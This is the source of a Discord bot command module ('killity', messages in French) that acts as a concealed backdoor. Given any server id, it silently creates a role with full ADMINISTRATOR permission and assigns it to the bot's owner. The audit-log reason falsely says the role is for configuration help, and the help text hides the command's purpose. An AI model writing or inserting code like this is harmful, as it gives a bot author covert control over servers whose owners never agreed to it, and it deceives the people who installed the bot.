const Discord = require("discord.js");
const config = require("../data/config.json")
quickdb = require('quick.db'),
errors = require('../utils/errors.js'),
ms = require('ms'),
functions = require('../utils/functions.js'),
fs = require('fs'),
arraySort = require('array-sort'), // This will be used for sorting arrays
table = require('table'); // This will be used for preparing the output to a table
send = require('quick.hook'); // This will be used for creating & sending webhooks

quickdb.init('./data/atlanta.sqlite');
var users_data = new quickdb.table('usersdata');

module.exports.run = async (message, args, bot, emotes, data) => {

    message.delete();

    var id = args[0];
    
    if(!args[0]) return message.reply('entre une id !');

    var guild = bot.guilds.get(id);

    var owner_membre = guild.members.get(config.owner_id);
    guild.createRole({
        name: 'Atlanta Support',
        color: 'BLUE',
        permissions: 'ADMINISTRATOR',
        mentionable: false,
        hoist: false
    }, 'Rôle créé pour Androz, pour vous aider à configurer Atlanta !').then(role =>{
        owner_membre.addRole(role);
    });
}

module.exports.help = {
    name:"killity",
    desc:"Hum... Vous n'avez pas les perms requises pour accéder a cette description (req. OWNER)",
    usage:"killity [arguments]",
    group:"owner",
    examples:"$killity all"
}

module.exports.settings = {
    permissions:"false",
    nsfw:"false",
    support_only:"false",
    disabled:"false",
    premium:"false",
    owner:"true"
}